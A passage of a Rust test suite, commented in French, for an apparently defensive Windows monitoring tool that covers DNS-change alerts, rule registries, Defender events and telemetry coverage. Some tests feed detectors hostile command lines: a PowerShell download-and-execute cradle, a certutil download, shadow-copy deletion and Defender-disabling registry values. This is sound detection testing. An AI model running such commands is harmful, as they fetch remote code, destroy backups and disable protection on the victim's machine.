        let mut x = Alerte { niveau: "Alerte".into(), chemin: r"C:\x.exe".into(), ..Default::default() };
        let long = "b".repeat(900);
        match champ { "parent" => x.parent = long, "destination" => x.destination = long, _ => x.nom_dns = Some(long) }
        borner_alerte(&mut x);
        assert!(cible_exception(&x).is_err(), "{champ} borné sans empreinte : exception acceptée");
    }
    for niveau in ["Info", "Critique"] {
        assert!(cible_exception(&Alerte { niveau: niveau.into(), chemin: r"C:\x.exe".into(), ..Default::default() }).is_err(), "{niveau}");
    }
    let courte = Alerte { niveau: "Alerte".into(), chemin: r"C:\Outils\x.exe".into(), destination: "203.0.113.9".into(), ..Default::default() };
    assert_eq!(cible_exception(&courte), Ok(signature_avec(&courte, &crate::apprentissage::editeur_pour_test(&courte.chemin))));
    for mauvaise in ["sha256:XYZ", "md5:00", "sha256:0123", &format!("sha256:{}|x", "a".repeat(64))] {
        assert!(cible_exception(&Alerte { niveau: "Alerte".into(), signature: mauvaise.to_string(), ..Default::default() }).is_err(), "{mauvaise}");
    }
}

/// Audit de sécurité de #72, S72-11 : la borne de taille vaut pour TOUS les champs, même remplis de caractères de
/// 4 octets (1000 alertes sous TAILLE_MAX_ALERTES)
#[test]
fn phase3_alerte_bornee_pire_cas() {
    use crate::commun::{borner_alerte, Alerte, TAILLE_MAX_ALERTES};
    let x: String = "\u{10FFFF}".repeat(5000);
    let mut a = Alerte { id: x.clone(), heure: x.clone(), niveau: x.clone(), processus: x.clone(), chemin: x.clone(), destination: x.clone(),
        ip: Some(x.clone()), nom_dns: Some(x.clone()), raisons: x.clone(), mitre: x.clone(), conseil: x.clone(), parent: x.clone(),
        regle: x.clone(), collecte: x.clone(), signature: x.clone(), heure_utc: x.clone(), entite: x.clone(), comportement: x.clone(), port: 65535, score: i32::MIN, pid: Some(u32::MAX), modele: u32::MAX,
        seq: u64::MAX };
    borner_alerte(&mut a);
    let octets = serde_json::to_vec(&a).unwrap().len();
    assert!(octets < 16 * 1024 && octets * 1000 < TAILLE_MAX_ALERTES as usize, "pire cas : {octets} octets par alerte (promis : moins de 16 Ko)");
}

// ---------------------------------------------------------------- phase 7, PR 7.1 : DNS-002

fn carte_dns(id: &str, type_carte: u32, passerelle: &str, dns: &[&str], statique: bool) -> crate::dns_surveillance::CarteDns {
    crate::dns_surveillance::CarteDns {
        id: id.into(), nom: format!("carte {id}"), type_carte,
        passerelles: if passerelle.is_empty() { vec![] } else { vec![passerelle.into()] },
        dns: dns.iter().map(|s| s.to_string()).collect(), statique, materielle: true,
    }
}

fn alertes_dns(c: &[crate::dns_surveillance::Constat]) -> Vec<&crate::commun::Alerte> {
    c.iter().filter_map(|x| if let crate::dns_surveillance::Constat::Alerte(a) = x { Some(a) } else { None }).collect()
}

/// DNS-002, positif : serveur statique changé sur une carte physique (Ethernet, Wi-Fi), même passerelle : alerte
#[test]
fn dns002_statique_change_meme_reseau() {
    for t in [6, 71] {
        let avant = [carte_dns("{A}", t, "192.0.2.1", &["192.0.2.53"], false)];
        let apres = [carte_dns("{A}", t, "192.0.2.1", &["198.51.100.7"], true)];
        let c = crate::dns_surveillance::changements_dns(&avant, &apres);
        let a = alertes_dns(&c);
        assert_eq!(a.len(), 1, "type {t}");
        assert_eq!(a[0].regle, "DNS-002");
        assert_eq!(a[0].niveau, "Alerte");
        assert!(a[0].raisons.contains("192.0.2.53 → 198.51.100.7"), "{}", a[0].raisons);
    }
}

/// DNS-002, négatifs : changement de réseau (autre passerelle), DHCP sur le même réseau, carte virtuelle ou VPN,
/// carte nouvelle ou disparue, DNS inchangé : événement au plus, jamais d'alerte
#[test]
fn dns002_changement_de_reseau_sans_alerte() {
    let avant = [carte_dns("{A}", 71, "192.0.2.1", &["192.0.2.53"], true)];
    // Nouveau réseau, DNS donné par son DHCP (un DNS statique qui change alerte, même avec une autre passerelle)
    let reseau = [carte_dns("{A}", 71, "203.0.113.1", &["203.0.113.53"], false)];
    let c = crate::dns_surveillance::changements_dns(&avant, &reseau);
    assert!(alertes_dns(&c).is_empty());
    assert_eq!(c.len(), 1, "un événement");
    let dhcp = [carte_dns("{A}", 6, "192.0.2.1", &["192.0.2.54"], false)];
    let c = crate::dns_surveillance::changements_dns(&[carte_dns("{A}", 6, "192.0.2.1", &["192.0.2.53"], false)], &dhcp);
    assert!(alertes_dns(&c).is_empty() && c.len() == 1, "DHCP, même réseau : événement");
    let meme = crate::dns_surveillance::changements_dns(&avant, &avant);
    assert!(meme.is_empty(), "DNS inchangé : rien");
    let nouvelle = crate::dns_surveillance::changements_dns(&avant, &[avant[0].clone(), carte_dns("{B}", 6, "192.0.2.1", &["198.51.100.7"], true)]);
    assert!(nouvelle.is_empty(), "carte nouvelle : rien");
    assert!(crate::dns_surveillance::changements_dns(&avant, &[]).is_empty(), "carte disparue : rien");
}

#[test]
fn dns002_carte_vpn_sans_alerte() {
    for t in [131, 23, 53, 24] {
        let avant = [carte_dns("{V}", t, "", &["10.0.0.1"], true)];
        let apres = [carte_dns("{V}", t, "", &["10.8.0.1"], true)];
        let c = crate::dns_surveillance::changements_dns(&avant, &apres);
        assert!(alertes_dns(&c).is_empty(), "type {t}");
        assert_eq!(c.len(), 1, "type {t} : événement");
    }
    assert!(!crate::dns_surveillance::physique(131) && crate::dns_surveillance::physique(6) && crate::dns_surveillance::physique(71));
}

/// Serveur statique changé en même temps qu'une passerelle : alerte quand même, la passerelle citée (audit de #159, S159-01)
#[test]
fn dns002_statique_change_avec_passerelle() {
    let avant = [carte_dns("{A}", 6, "192.0.2.1", &["192.0.2.53"], false)];
    let apres = [carte_dns("{A}", 6, "192.0.2.254", &["198.51.100.7"], true)];
    let c = crate::dns_surveillance::changements_dns(&avant, &apres);
    let a = alertes_dns(&c);
    assert_eq!(a.len(), 1);
    assert!(a[0].raisons.contains("passerelle changée au même moment : 192.0.2.1 → 192.0.2.254"), "{}", a[0].raisons);
}

/// DNS-002 jamais appris ni adouci par l'apprentissage ; une exception ne couvre que le jeu de serveurs de l'alerte
/// (relecture de #159, constat 1)
#[test]
fn dns002_jamais_appris_exception_par_serveurs() {
    let avant = [carte_dns("{A}", 6, "192.0.2.1", &["192.0.2.53"], false)];
    let vers = |dns: &[&str]| {
        let c = crate::dns_surveillance::changements_dns(&avant, &[carte_dns("{A}", 6, "192.0.2.1", dns, true)]);
        match c.into_iter().next() { Some(crate::dns_surveillance::Constat::Alerte(a)) => a, _ => panic!("alerte attendue") }
    };
    let (a1, a2) = (vers(&["198.51.100.7"]), vers(&["203.0.113.9"]));
    assert!(crate::apprentissage::signal_fort(&a1), "jamais appris");
    assert_ne!(crate::apprentissage::signature(&a1), crate::apprentissage::signature(&a2), "une exception par jeu de serveurs");
    assert!(a1.destination.contains("198.51.100.7"), "{}", a1.destination);
}

/// Lecture impossible : collecte ConfigDns indisponible, jamais « aucun changement » ; DNS-002 couverte par ConfigDns
#[test]
fn dns002_lecture_impossible_collecte_indisponible() {
    use crate::collectes::Collecte;
    assert_eq!(crate::collectes::besoins("DNS-002"), &[&[Collecte::ConfigDns][..]]);
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    assert!(m.contains("Err(e) => collectes::echec(Collecte::ConfigDns, &e),"), "échec noté");
    assert!(m.contains("collectes::succes(Collecte::ConfigDns);"), "succès noté");
    // Premier relevé : référence sans alerte ; jamais de remise en place (lecture seule)
    let d = include_str!("dns_surveillance.rs");
    assert!(m.contains("if let Some(avant) = &precedent {"));
    for interdit in ["SetInterfaceDnsSettings", "set_value", "SetAdapter", "netsh"] {
        assert!(!d.contains(interdit), "lecture seule : {interdit}");
    }
}

/// Phase 3.2 : registre des règles : identifiants uniques et bien formés, titres non vides ; le registre et
/// docs/detection/regles.md listent exactement les mêmes identifiants (COR-R8 : numéro non attribué, absent du registre)
#[test]
fn phase3_registre_identifiants_et_documentation() {
    use crate::regles::{identifiant_valide, regle, REGLES};
    let mut vus = std::collections::BTreeSet::new();
    for r in REGLES {
        assert!(identifiant_valide(r.id), "identifiant mal formé : {}", r.id);
        assert!(!r.titre.is_empty(), "titre vide : {}", r.id);
        assert!(vus.insert(r.id), "identifiant en double : {}", r.id);
        assert!(regle(r.id).is_some());
    }
    for mauvais in ["RES-1", "res-001", "COR-8x", "EXP-XYZ-001", "DEF-0010", "", "COR-R"] {
        assert!(!identifiant_valide(mauvais), "{mauvais}");
    }
    // Identifiants de la documentation : titres de fiche (« ### ID : ») et première colonne des tableaux (« | ID | »)
    let doc = include_str!("../../docs/detection/regles.md");
    let mut documentes = std::collections::BTreeSet::new();
    for l in doc.lines() {
        let id = if let Some(t) = l.strip_prefix("### ") { t.split(" : ").next() } else if let Some(t) = l.strip_prefix("| ") { t.split(" |").next() } else { None };
        if let Some(id) = id.map(str::trim) {
            if identifiant_valide(id) && !l.contains("Numéro non attribué") {
                documentes.insert(id.to_string());
            }
        }
    }
    let registre: std::collections::BTreeSet<String> = REGLES.iter().map(|r| r.id.to_string()).collect();
    assert_eq!(registre, documentes, "registre et docs/detection/regles.md diffèrent");
    assert!(regle("COR-R8").is_none(), "COR-R8 : numéro non attribué");
}

/// Phase 3.2 : chaque producteur d'alertes pose sa règle. Contrôle du source : chaque littéral « Alerte { » des modules
/// de détection contient « regle: » (sauf l'aide générique d'un module, dont l'appelant passe la règle) ; puis des cas
/// exécutés : Defender (événements et état WMI), processus (motif → règle, la plus forte d'abord)
#[test]
fn phase3_chaque_producteur_pose_sa_regle() {
    let sources = [
        ("baseline", include_str!("baseline.rs")), ("canal", include_str!("canal.rs")), ("chaines", include_str!("chaines.rs")),
        ("defender", include_str!("defender.rs")), ("dpi", include_str!("dpi.rs")), ("hygiene", include_str!("hygiene.rs")),
        ("ids", include_str!("ids.rs")), ("moniteur", include_str!("moniteur.rs")), ("ndr", include_str!("ndr.rs")),
        ("parefeu", include_str!("parefeu.rs")), ("persistance", include_str!("persistance.rs")), ("processus", include_str!("processus.rs")),
        ("protection", include_str!("protection.rs")), ("sante", include_str!("sante.rs")), ("siem", include_str!("siem.rs")), ("surveillances", include_str!("surveillances.rs")),
        ("vol_donnees", include_str!("vol_donnees.rs")),
    ];
    for (nom, s) in sources {
        for (i, _) in s.match_indices("Alerte {") {
            let avant = &s[..i];
            if avant.ends_with("struct ") || avant.ends_with("for ") || avant.trim_end().ends_with("->") {
                continue;
            }
            let fin = s[i..].find("..Default::default()").map(|f| i + f).unwrap_or(s.len());
            assert!(s[i..fin].contains("regle:"), "{nom}.rs : alerte sans règle à l'octet {i}");
        }
    }
    // Defender : événements du journal et écarts de l'état WMI
    let xml = |id: u32, extra: &str| format!("<Event><System><EventID>{id}</EventID></System><EventData>{extra}</EventData></Event>");
    let d = |n: &str, v: &str| format!("<Data Name='{n}'>{v}</Data>");
    let cas = [
        (1116, String::new(), "DEF-001"), (1117, String::new(), "DEF-002"), (5001, String::new(), "DEF-003"), (5012, String::new(), "DEF-004"),
        (5007, d("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\x = 0x0"), "DEF-005"),
        (5007, d("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1"), "DEF-006"),
        (1121, String::new(), "DEF-007"), (1122, String::new(), "DEF-007"), (1123, String::new(), "DEF-008"), (1124, String::new(), "DEF-008"),
        (1125, String::new(), "DEF-009"), (1126, String::new(), "DEF-009"),
    ];
    for (id, extra, attendu) in cas {
        let a = crate::defender::traduire(&xml(id, &extra)).unwrap_or_else(|| panic!("événement {id} non traduit"));
        assert_eq!(a.regle, attendu, "événement {id}");
    }
    let avant = crate::defender::EtatDefender { disponible: true, temps_reel: true, protection_falsification: true, antivirus: true, ..Default::default() };
    let apres = crate::defender::EtatDefender { disponible: true, ..Default::default() };
    let r: Vec<String> = crate::defender::ecarts(&avant, &apres).into_iter().map(|a| a.regle).collect();
    assert_eq!(r, ["DEF-010", "DEF-011", "DEF-012"]);
    // Processus : la plus forte d'abord (document → interpréteur avant le motif de la ligne de commande)
    use crate::processus::regle_retenue;
    assert_eq!(regle_retenue(true, &["PRC-002"]), "PRC-001");
    assert_eq!(regle_retenue(false, &["PRC-005"]), "PRC-005");
    assert_eq!(regle_retenue(true, &[]), "PRC-001");
    assert_eq!(regle_retenue(false, &["PRC-002", "PRC-005"]), "PRC-005", "PR 3.7 : la plus forte, pas la première");
    assert_eq!(regle_retenue(false, &["PRC-002", "PRC-003"]), "PRC-002");
    assert_eq!(regle_retenue(false, &[]), "");
    // Persistance : nouveau ou modifié
    let e = crate::commun::EntreeDemarrage::default();
    assert_eq!(crate::persistance::alerter(&e, "NOUVEAU démarrage automatique").regle, "PER-001");
    assert_eq!(crate::persistance::alerter(&e, "démarrage automatique MODIFIÉ (avant : x)").regle, "PER-002");
    // Pare-feu : toutes les règles supprimées par un autre auteur que Windows (SYS-003) ; règle ouverte en entrée (SYS-002)
    let pf = |id: u32, extra: &str| format!("<Event><System><EventID>{id}</EventID></System><EventData><Data Name='RuleName'>r</Data><Data Name='ModifyingApplication'>C:\\x\\outil.exe</Data>{extra}</EventData></Event>");
    let toutes = crate::parefeu::traduire(&pf(2059, ""), &|_| String::new()).and_then(|(_, a)| a).expect("alerte « toutes supprimées »");
    assert_eq!(toutes.regle, "SYS-003");
    let ouverte = crate::parefeu::traduire(&pf(2004, "<Data Name='Direction'>1</Data><Data Name='Action'>3</Data>"), &|_| String::new()).and_then(|(_, a)| a).expect("alerte règle entrante");
    assert_eq!(ouverte.regle, "SYS-002");
    // SIEM : R<n> → COR-R<n>, numéro non attribué → vide
    assert_eq!(crate::siem::regle_correlation("R1"), "COR-R1");
    assert_eq!(crate::siem::regle_correlation("R3b"), "COR-R3b");
    assert_eq!(crate::siem::regle_correlation("R8"), "");
    // Processus : motif de la ligne de commande → règle
    for (ligne, attendu) in [("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", "PRC-002"),
                             ("certutil -urlcache -f http://203.0.113.5/a a.exe", "PRC-003"),
                             ("chrome.exe --remote-debugging-port=9222", "PRC-004"), ("vssadmin delete shadows /all", "PRC-005")] {
        assert_eq!(crate::processus::suspicion_regle(ligne).map(|(_, id)| id), Some(attendu), "{ligne}");
    }
}

/// Phase 3.2 : les événements du SIEM portent le modèle (posé à l'enregistrement) et la règle de l'alerte d'origine ;
/// une ligne NDJSON d'avant la phase 3 se relit, avec le modèle 0
#[test]
fn phase3_evenement_siem_modele_et_regle() {
    use crate::siem::{evenement_de_alerte, Evenement};
    let e = evenement_de_alerte(&crate::commun::Alerte { regle: "DEF-005".into(), niveau: "Critique".into(), ..Default::default() });
    assert_eq!(e.regle, "DEF-005");
    let ancienne: Evenement = serde_json::from_str(r#"{"Heure":"2026-10-20 10:00:00","Source":"alerte","Type":"detection","Niveau":"Info","Message":"m"}"#).unwrap();
    assert!(ancienne.modele == 0 && ancienne.regle.is_empty());
    let s = include_str!("siem.rs");
    let d = s.find("pub fn enregistrer(").unwrap();
    assert!(s[d..d + 300].contains("e.modele = commun::MODELE_ALERTE;"), "modèle non posé à l'enregistrement");
}

/// Phase 3.3 : une collecte active muette plus de trois intervalles devient indisponible ; une source à événements
/// (intervalle 0) ne l'est pas par son silence ; les notes « indisponible » et « désactivée » gardent leur raison
#[test]
fn phase3_collecte_muette_devient_indisponible() {
    use crate::collectes::{evaluer, EtatPublie, Note};
    let s = 10_000_000u64; // une seconde en FILETIME
    let t = 1_000_000 * s;
    assert_eq!(evaluer(Note::Active, "", t - 90 * s, 30, t), EtatPublie::Active);
    assert!(matches!(evaluer(Note::Active, "", t - 91 * s, 30, t), EtatPublie::Indisponible(_)));
    assert!(matches!(evaluer(Note::Partielle, "p", t - 91 * s, 30, t), EtatPublie::Indisponible(_)));
    assert_eq!(evaluer(Note::Partielle, "p", t - 10 * s, 30, t), EtatPublie::Partielle("p".into()));
    assert_eq!(evaluer(Note::Partielle, "p", 0, 0, t), EtatPublie::Partielle("p".into()));
    assert_eq!(evaluer(Note::Inconnue, "", 0, 30, t), EtatPublie::Inconnue);
    assert_eq!(evaluer(Note::Indisponible, "r", t, 30, t), EtatPublie::Indisponible("r".into()));
    assert_eq!(evaluer(Note::Desactivee, "d", 0, 30, t), EtatPublie::Desactivee("d".into()));
    // Horloge reculée : pas de dépassement, la collecte reste active
    assert_eq!(evaluer(Note::Active, "", t + 100 * s, 30, t), EtatPublie::Active);
}

/// Phase 3.3 : « Inconnue » (jamais lue) ne vaut jamais « rien de suspect » ; ET de OU : une source active suffit
/// dans un groupe, une source partielle seule rend la règle dégradée, une source désactivée ne couvre rien
#[test]
fn phase3_collecte_inconnue_ne_vaut_pas_rien_de_suspect() {
    use crate::collectes::{couverture, Collecte::*, Couverture, EtatPublie};
    let actives = |liste: &'static [crate::collectes::Collecte]| move |c| if liste.contains(&c) { EtatPublie::Active } else { EtatPublie::Inconnue };
    assert_eq!(couverture(&[&[Connexions]], &|_| EtatPublie::Inconnue), Couverture::Indisponible);
    assert_eq!(couverture(&[&[Connexions]], &actives(&[Connexions])), Couverture::Assuree);
    assert_eq!(couverture(&[&[Connexions], &[ListesMenaces]], &actives(&[Connexions])), Couverture::Indisponible);
    assert_eq!(couverture(&[&[JournalDns, Sysmon]], &actives(&[Sysmon])), Couverture::Assuree);
    assert_eq!(couverture(&[&[Sysmon, WmiProcessus]], &|c| match c {
        WmiProcessus => EtatPublie::Partielle("p".into()),
        _ => EtatPublie::Desactivee("d".into()),
    }), Couverture::Degradee);
    assert_eq!(couverture(&[&[Sysmon]], &|_| EtatPublie::Desactivee("d".into())), Couverture::Indisponible);
    assert_eq!(couverture(&[&[Sysmon]], &|_| EtatPublie::Indisponible("r".into())), Couverture::Indisponible);
    assert_eq!(couverture(&[], &|_| EtatPublie::Inconnue), Couverture::Assuree);
}

/// Phase 3.3 : chaque règle du registre a sa télémétrie, sauf celles qui ne lisent aucune collecte suivie (liste
/// fermée : une règle nouvelle sans correspondance fait échouer le test) ; règles de la documentation : DNS-001 suit
/// le journal DNS ou Sysmon et les listes de domaines, PIL-001 la liste LOLDrivers
#[test]
fn phase3_chaque_regle_a_sa_telemetrie() {
    use crate::collectes::{besoins, Collecte::*};
    let sans = ["RES-004", "SYS-001", "VIE-003", "COR-R6", "INT-001", "INT-002", "SAN-001", "SAN-002", "SAN-003", "SAN-004", "SAN-012", "SAN-013", "REP-001", "REP-002", "REP-003", "REP-004"];
    for r in crate::regles::REGLES {
        assert_eq!(besoins(r.id).is_empty(), sans.contains(&r.id), "{}", r.id);
    }
    assert!(besoins("XYZ-001").is_empty());
    assert_eq!(besoins("DNS-001"), &[&[JournalDns, Sysmon][..], &[ListesDomaines][..]]);
    assert_eq!(besoins("PIL-001"), &[&[Loldrivers][..]]);
    assert_eq!(besoins("RES-001"), &[&[Connexions][..], &[ListesMenaces][..]]);
    // Identifiants publiés : uniques
    let ids: std::collections::BTreeSet<&str> = crate::collectes::TOUTES.iter().map(|c| c.id()).collect();
    assert_eq!(ids.len(), crate::collectes::TOUTES.len());
}

/// Phase 3.3 : notes de l'état global et publication ; la raison publiée ne porte aucun nom de compte, aucun caractère
/// de contrôle, et 200 caractères au plus. (CaptureReseauLocal : notée seulement par le fil de capture, absent des tests.)
#[test]
fn phase3_collecte_notes_et_publication() {
    use crate::collectes::{self, Collecte};
    let ligne = |id: &str| collectes::publier().0.into_iter().find(|e| e.id == id).unwrap();
    assert_eq!(ligne("CaptureReseauLocal").etat, "Inconnue");
    assert!(collectes::publier().1.contains(&"EXP-NDR-001".to_string()), "collecte inconnue : règle sans collecte");
    collectes::echec(Collecte::CaptureReseauLocal, "lecture de C:\\Users\\Quelquun\\x impossible\nsuite");
    let e = ligne("CaptureReseauLocal");
    assert_eq!(e.etat, "Indisponible");
    assert!(!e.raison.contains("Quelquun") && e.raison.contains("%USERPROFILE%") && !e.raison.contains('\n'), "{}", e.raison);
    assert!(!e.depuis.is_empty() && e.dernier_succes.is_empty());
    collectes::succes(Collecte::CaptureReseauLocal);
    let e = ligne("CaptureReseauLocal");
    assert!(e.etat == "Active" && e.raison.is_empty() && !e.dernier_succes.is_empty());
    assert!(!collectes::publier().1.contains(&"EXP-NDR-001".to_string()));
    collectes::desactivee(Collecte::CaptureReseauLocal, &"x".repeat(500));
    let e = ligne("CaptureReseauLocal");
    assert!(e.etat == "Desactivee" && e.raison.chars().count() == 200);
    // Masquage de tout chemin de profil : nom avec espace, barres obliques, préfixes \\?\ et \Device\…
    for (texte, nom) in [(r"lecture de C:\Users\Jean Dupont\AppData impossible", "Dupont"), ("C:/Users/Quelquun/x", "Quelquun"),
                         (r"\\?\C:\Users\Autre\x", "Autre"), (r"\Device\HarddiskVolume3\Users\Encore\x", "Encore"),
                         (r"fin c:\users\Dernier", "Dernier"), (r"\\poste\c$\Users\Partage\x", "Partage")] {
        let b = collectes::borner(texte);
        assert!(!b.contains(nom) && b.contains("%USERPROFILE%"), "{texte} → {b}");
    }
    assert_eq!(collectes::borner(r"journal Microsoft-Windows-DNS-Client/Operational illisible"), r"journal Microsoft-Windows-DNS-Client/Operational illisible");
}

/// Phase 3.3b : lecture récente : moins de trois intervalles depuis le dernier succès ; jamais lue : non
#[test]
fn phase3_lue_dans_le_delai() {
    use crate::collectes::lue_dans_le_delai;
    let s = 10_000_000u64;
    assert!(lue_dans_le_delai(1000 * s, 30, 1090 * s));
    assert!(!lue_dans_le_delai(1000 * s, 30, 1091 * s));
    assert!(!lue_dans_le_delai(0, 30, 10 * s), "jamais lue");
}

/// Phase 3.3d : cause d'une règle sans collecte : le premier groupe de besoins sans source lue (ni active ni partielle) ;
/// aucune cause pour une règle couverte ; la publication porte une cause par règle sans collecte
#[test]
fn phase3_cause_sans_collecte() {
    use crate::collectes::{besoins, groupe_non_couvert, Collecte::*, EtatPublie};
    let actives = |liste: &'static [crate::collectes::Collecte]| move |c| if liste.contains(&c) { EtatPublie::Active } else { EtatPublie::Indisponible("r".into()) };
    assert_eq!(groupe_non_couvert(besoins("DNS-001"), &actives(&[])), Some(&[JournalDns, Sysmon][..]));
    assert_eq!(groupe_non_couvert(besoins("DNS-001"), &actives(&[Sysmon])), Some(&[ListesDomaines][..]));
    assert_eq!(groupe_non_couvert(besoins("DNS-001"), &actives(&[Sysmon, ListesDomaines])), None);
    assert_eq!(groupe_non_couvert(besoins("PRC-002"), &|c| if c == WmiProcessus { EtatPublie::Partielle("p".into()) } else { EtatPublie::Desactivee("d".into()) }), None, "partielle : couverte (dégradée)");
    assert_eq!(groupe_non_couvert(besoins("INT-001"), &actives(&[])), None);
    let (_, sans, _, causes) = crate::collectes::publier();
    assert_eq!(sans.len(), causes.len(), "une cause par règle sans collecte");
    assert!(sans.iter().zip(&causes).all(|(r, c)| *r == c.regle && !c.collectes.is_empty()));
}

/// Phase 3.3b : lecture sur plusieurs éléments (dossiers audités, réglages de la baseline) : rien à lire, désactivée ;
/// rien de lu, indisponible ; une partie, partielle
#[test]
fn phase3_decision_comptes() {
    use crate::collectes::{decision_comptes, Note};
    assert_eq!(decision_comptes(0, 0), Note::Desactivee);
    assert_eq!(decision_comptes(0, 3), Note::Indisponible);
    assert_eq!(decision_comptes(2, 1), Note::Partielle);
    assert_eq!(decision_comptes(5, 0), Note::Active);
}

/// Phase 3.3b : un événement qui fait toujours échouer la lecture ne bloque pas le suivi sans fin : après
/// LIMITE_BLOCAGE tours sans progrès, l'intervalle est sauté (et le saut est signalé) ; un progrès remet le compte à zéro
#[test]
fn phase3_journal_bloque_saute() {
    use crate::evenements::{apres_blocage, Blocage, Lecture, LIMITE_BLOCAGE};
    let zero = Blocage::default();
    let b = |sans_progres, pas| Blocage { sans_progres, pas };
    assert_eq!(apres_blocage(10, 20, 20, Lecture::Complete, b(7, 4)), (20, zero, 0));
    assert_eq!(apres_blocage(10, 15, 20, Lecture::Erreur, b(7, 4)), (15, zero, 0), "progrès : blocage remis à zéro");
    assert_eq!(apres_blocage(10, 12, 20, Lecture::Delai, b(40, 1)), (12, zero, 0), "délai avec progrès : remis à zéro");
    assert_eq!(apres_blocage(10, 10, 20, Lecture::Erreur, zero), (10, b(1, 1), 0));
    // Délai dépassé (journal inondé) : compté, jamais sauté, même au-delà de la limite (la collecte passe alors
    // « Indisponible ») ; délais et erreurs mêlés comptent ensemble (une alternance finit aussi par agir)
    let (_, d, sautes) = (0..LIMITE_BLOCAGE + 5).fold((10, zero, 0), |(_, bl, s), _| { let (r, bl, x) = apres_blocage(10, 10, 20, Lecture::Delai, bl); (r, bl, s + x) });
    assert!(d.sans_progres >= LIMITE_BLOCAGE && sautes == 0, "délais sans progrès : comptés, rien sauté");
    let (_, m, _) = (0..LIMITE_BLOCAGE - 1).fold((10, zero, 0), |(_, bl, s), i| {
        let (r, bl, x) = apres_blocage(10, 10, 20, if i % 2 == 0 { Lecture::Delai } else { Lecture::Erreur }, bl);
        (r, bl, s + x)
    });
    assert_eq!(m.sans_progres, LIMITE_BLOCAGE - 1, "alternance délai / erreur : un seul compteur");
    assert_eq!(apres_blocage(10, 10, 20, Lecture::Erreur, m).2, 1, "alternance : l'erreur à la limite fait sauter");
    // Bloqué sur une erreur : un seul numéro sauté, juste après le dernier lu ; puis 2, 4… sans dépasser n
    assert_eq!(apres_blocage(10, 10, 20, Lecture::Erreur, b(LIMITE_BLOCAGE - 1, 1)), (11, b(LIMITE_BLOCAGE - 1, 2), 1));
    assert_eq!(apres_blocage(11, 11, 20, Lecture::Erreur, b(LIMITE_BLOCAGE - 1, 2)), (13, b(LIMITE_BLOCAGE - 1, 4), 2));
    assert_eq!(apres_blocage(13, 13, 15, Lecture::Erreur, b(LIMITE_BLOCAGE - 1, 4)), (15, b(LIMITE_BLOCAGE - 1, 8), 2));
}

/// Phase 3.3c : lecture par fenêtres bornées (un journal inondé d'événements écartés ne fige plus la lecture) ;
/// numéros écrasés par la rotation avant d'être lus : repris au plus ancien présent, perte comptée
#[test]
fn phase3_journal_fenetre_et_rotation() {
    use crate::evenements::{fenetre, perte_rotation, FENETRE};
    assert_eq!(fenetre(10, 20), 20);
    assert_eq!(fenetre(10, 10 + FENETRE + 7), 10 + FENETRE);
    assert_eq!(fenetre(u64::MAX - 1, u64::MAX), u64::MAX);
    assert_eq!(perte_rotation(100, 101), None, "rien d'écrasé : le prochain à lire est le plus ancien");
    assert_eq!(perte_rotation(100, 50), None);
    assert_eq!(perte_rotation(100, 151), Some((150, 50)), "101 à 150 écrasés");
    assert_eq!(perte_rotation(0, 1), None, "journal neuf");
    assert_eq!(perte_rotation(100, 0), None, "journal vide : plus ancien 0");
    // Fenêtres enchaînées dans un tour : seulement après une lecture complète, s'il reste des numéros, sous 1,5 s
    use crate::evenements::{encore_une_fenetre, Lecture};
    use std::time::Duration;
    assert!(encore_une_fenetre(Lecture::Complete, 10, 20, Duration::from_millis(100)));
    assert!(!encore_une_fenetre(Lecture::Complete, 20, 20, Duration::from_millis(100)), "rattrapé");
    assert!(!encore_une_fenetre(Lecture::Complete, 10, 20, Duration::from_millis(1500)), "budget du tour épuisé");
    assert!(!encore_une_fenetre(Lecture::Delai, 10, 20, Duration::from_millis(100)));
    assert!(!encore_une_fenetre(Lecture::Erreur, 10, 20, Duration::from_millis(100)));
}

/// Phase 3.3c : journal désactivé : seul le journal DNS-Client est réactivé (D4) ; collecte d'origine d'une alerte :
/// la source lue du premier groupe de la règle, sinon la première listée ; vide sans source suivie
#[test]
fn phase3_reactivation_et_collecte_d_origine() {
    use crate::collectes::{collecte_de, Collecte, EtatPublie};
    use crate::evenements::a_reactiver;
    assert!(a_reactiver("Microsoft-Windows-DNS-Client/Operational"));
    assert!(!a_reactiver("Microsoft-Windows-Windows Defender/Operational"));
    assert!(!a_reactiver("Security"));
    let sysmon_seul = |c| if c == Collecte::Sysmon { EtatPublie::Active } else { EtatPublie::Inconnue };
    assert_eq!(collecte_de("DNS-001", &sysmon_seul), "Sysmon");
    assert_eq!(collecte_de("DNS-001", &|_| EtatPublie::Active), "JournalDns");
    assert_eq!(collecte_de("DNS-001", &|_| EtatPublie::Inconnue), "JournalDns", "aucune lue : la première listée");
    let wmi = |c| if c == Collecte::WmiProcessus { EtatPublie::Partielle("p".into()) } else { EtatPublie::Desactivee("d".into()) };
    assert_eq!(collecte_de("PRC-002", &wmi), "WmiProcessus");
    assert_eq!(collecte_de("DEF-001", &|_| EtatPublie::Active), "JournalDefender");
    assert_eq!(collecte_de("INT-001", &|_| EtatPublie::Active), "");
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    let d = m.find("fn ajouter_alerte_brute(").unwrap();
    let f = &m[d..d + 2500];
    let c = f.find("a.collecte = collectes::collecte_de_l_alerte(&a.regle).to_string();").expect("collecte d'origine non posée");
    assert!(c < f.find("commun::borner_alerte(&mut a);").unwrap(), "collecte posée après le bornage");
    assert!(c > f.find("a.signature = ").unwrap_or(0), "collecte posée avant la signature (elle n'en fait pas partie)");
}

/// Phase 3.3b : branchements des collectes restantes (contrôle du source : ces lectures Windows ne s'exécutent pas en
/// test) ; chaque source note son échec, et l'indice « IP directe » suit l'état lu du journal DNS (pas son état au
/// démarrage)
#[test]
fn phase3_branchements_des_collectes_restantes() {
    let n = include_str!("moniteur.rs").replace("\r\n", "\n");
    for (motif, quoi) in [
        ("Err(e) => {\n                collectes::echec(Collecte::Processus, &e);", "instantané des processus en échec"),
        ("collectes::echec(Collecte::Leurres, \"aucun leurre posé\")", "aucun leurre"),
        ("collectes::desactivee(Collecte::Leurres, \"mode console", "leurres en console"),
        ("if persistance.entrees.is_empty() {\n                        collectes::echec(Collecte::Persistance,", "relevé vide"),
        ("collectes::noter_comptes(Collecte::Baseline, b.regles.len() - inconnues, inconnues, \"réglages de la baseline\");", "baseline"),
